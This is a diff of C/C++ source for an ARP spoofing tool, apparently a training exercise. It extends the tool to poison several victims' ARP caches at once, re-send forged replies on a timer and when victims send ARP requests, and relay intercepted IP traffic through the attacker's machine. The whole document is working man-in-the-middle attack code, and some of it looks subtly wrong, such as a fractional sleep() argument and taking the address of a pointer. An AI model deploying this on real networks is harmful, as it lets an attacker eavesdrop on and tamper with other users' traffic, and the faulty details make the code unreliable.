@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <string.h>
+#include <unistd.h>
 #include "arp_spoof.h"
 #include <sys/types.h>
 #include <sys/socket.h>
@@ -72,14 +73,13 @@ void arp_send_pkt_req(uint8_t* send_mac, uint8_t* send_ip, uint8_t* mymac, uint8
 	memcpy(arp_req_arp_hdr->source_protocol_addr, myip, 4);
 	memset(arp_req_arp_hdr->dest_hard_addr, 0, 6);
 	memcpy(arp_req_arp_hdr->dest_protocol_addr , send_ip, 4);
-	printf("1");
 	pcap_sendpacket(handle, packet, eth_hdr_len + arp_hdr_len);
-	printf("2");
 	while(1){
 		pcap_next_ex(handle, &header,(const u_char **)&rcvpkt);
 		if(ntohs(*((uint16_t*)(rcvpkt+12))) == 0x0806){
 			if(memcmp(rcvpkt+28,send_ip,4)==0){
 				memcpy(send_mac, rcvpkt + 22, 6);
+				print_len(send_mac,6);
 				break;
 			}
 			memcpy(send_mac, rcvpkt + 22, 6);
@@ -119,6 +119,7 @@ void arp_send_pkt_spoof(uint8_t* target_ip, uint8_t* send_mac, uint8_t* send_ip,
         memcpy(arp_sp_arp_hdr->dest_hard_addr, send_mac, 6);
         memcpy(arp_sp_arp_hdr->dest_protocol_addr , send_ip, 4);	
 	pcap_sendpacket(handle, packet, eth_hdr_len + arp_hdr_len);
+	printf("send packet\n");
 }
 
 void relay_packet(uint8_t* packet, uint8_t* mymac, uint8_t* target_mac, pcap_t* handle){
@@ -131,41 +132,47 @@ void relay_packet(uint8_t* packet, uint8_t* mymac, uint8_t* target_mac, pcap_t* 
 	pcap_sendpacket(handle, packet, len);
 }	
 
-void arp_spoof_on(uint8_t* send_mac1, uint8_t* send_ip1, uint8_t* target_ip1, uint8_t* send_mac2, uint8_t* send_ip2, uint8_t* target_ip2, uint8_t* mymac, uint8_t* myip, pcap_t* handle){
+void send_arp_all(int num_session, uint32_t sender_target[][100], map<uint32_t, uint8_t*> iptomac, uint8_t* mymac, uint8_t* myip, pcap_t* handle){
+	for(int i = 0 ; i < num_session; ++i){
+		printf("send arp_poisoning pkt!!\n");
+		print_len(iptomac[sender_target[0][i]],6);
+		arp_send_pkt_spoof((uint8_t*)(sender_target[1]+i), iptomac[sender_target[0][i]], (uint8_t*)(sender_target[0]+i), mymac, (uint8_t*)&myip, handle);
+	}
+}
+
+void arp_spoof_on(int num_session, uint32_t gatewayip, uint32_t sender_target[][100], map<uint32_t, uint8_t*> iptomac, uint8_t* mymac, uint8_t* myip, pcap_t* handle){
 	uint8_t* rcvpkt;
 	int count = 1;
 	struct pcap_pkthdr* header;
 
-	//arp_spoof session1
-	arp_send_pkt_spoof(target_ip1, send_mac1, send_ip1, mymac,(uint8_t*)&myip, handle);
-	//arp_spoof session2
-	arp_send_pkt_spoof(target_ip2, send_mac2, send_ip2, mymac,(uint8_t*)&myip, handle);
+	send_arp_all(num_session, sender_target, iptomac, mymac, myip, handle);
 	
 	while(1){
 		printf("this count is %d\n",count);
 		pcap_next_ex(handle, &header,(const u_char**)&rcvpkt);
-		if((ntohs(*((uint16_t*)(rcvpkt+12))) == 0x0806) && (ntohs(*((uint16_t*)(rcvpkt+20)))== 1) && (memcmp(rcvpkt + 6, send_mac1, 6) == 0) && (memcmp(rcvpkt + 38, target_ip1, 4) == 0 )){
-			arp_send_pkt_spoof(target_ip1, send_mac1, send_ip1, mymac,(uint8_t*)&myip, handle);
-			arp_send_pkt_spoof(target_ip2, send_mac2, send_ip2, mymac,(uint8_t*)&myip, handle);
+		for(int i = 0; i < num_session; ++i){
+			if((ntohs(*((uint16_t*)(rcvpkt+12))) == 0x0806) && (ntohs(*((uint16_t*)(rcvpkt+20)))== 1) && (memcmp(rcvpkt + 6, iptomac[sender_target[0][i]], 6) == 0) && (memcmp(rcvpkt + 38, (uint8_t*)&sender_target[1][i], 4) == 0 )){
+				sleep(0.0001);
+				send_arp_all(num_session, sender_target, iptomac, mymac, myip, handle);
+				break;
+			}
 		}
-		else if((ntohs(*((uint16_t*)(rcvpkt+12))) == 0x0806) && (ntohs(*((uint16_t*)(rcvpkt+20)))== 1) && (memcmp(rcvpkt + 6, send_mac2, 6) == 0) && (memcmp(rcvpkt + 38, target_ip2, 4) == 0 )){
-			arp_send_pkt_spoof(target_ip1, send_mac1, send_ip1, mymac,(uint8_t*)&myip, handle);
-			arp_send_pkt_spoof(target_ip2, send_mac2, send_ip2, mymac,(uint8_t*)&myip, handle);
-		}
-		else if((memcmp(rcvpkt + 6, send_mac1, 6) == 0) && (ntohs(*((uint16_t*)(rcvpkt+12))) == 0x800) && (memcmp(rcvpkt + 30, myip, 4) != 0)){
-			printf("relay packet");
-			relay_packet(rcvpkt, mymac, send_mac2, handle);
-		}
-		else if((memcmp(rcvpkt + 6, send_mac2, 6) == 0) && (ntohs(*((uint16_t*)(rcvpkt+12))) == 0x800) && (memcmp(rcvpkt + 30, myip, 4) != 0)){
-			printf("relay packet2");
-			relay_packet(rcvpkt, mymac, send_mac1, handle);
-		}
+		if((ntohs(*((uint16_t*)(rcvpkt+12))) == 0x800) && (memcmp(rcvpkt + 30, myip, 4) != 0)){
+				uint32_t pkt_ip = *((uint32_t*)(rcvpkt + 30));
+				if(iptomac.find(pkt_ip) == iptomac.end()){
+					printf("relay packet"); 
+					relay_packet(rcvpkt, mymac, iptomac[gatewayip], handle);
+				}
+				else{
+					printf("relay packet2");
+					relay_packet(rcvpkt, mymac, iptomac[pkt_ip] , handle);
+				}
+				
+			}
 		
 		count++;
 		if( count % 500 == 0){
-			arp_send_pkt_spoof(target_ip1, send_mac1, send_ip1, mymac,(uint8_t*)&myip, handle);
-                        arp_send_pkt_spoof(target_ip2, send_mac2, send_ip2, mymac,(uint8_t*)&myip, handle);
-	
+			send_arp_all(num_session, sender_target, iptomac, mymac, myip, handle);
 			count = 1;
 		}
 	}
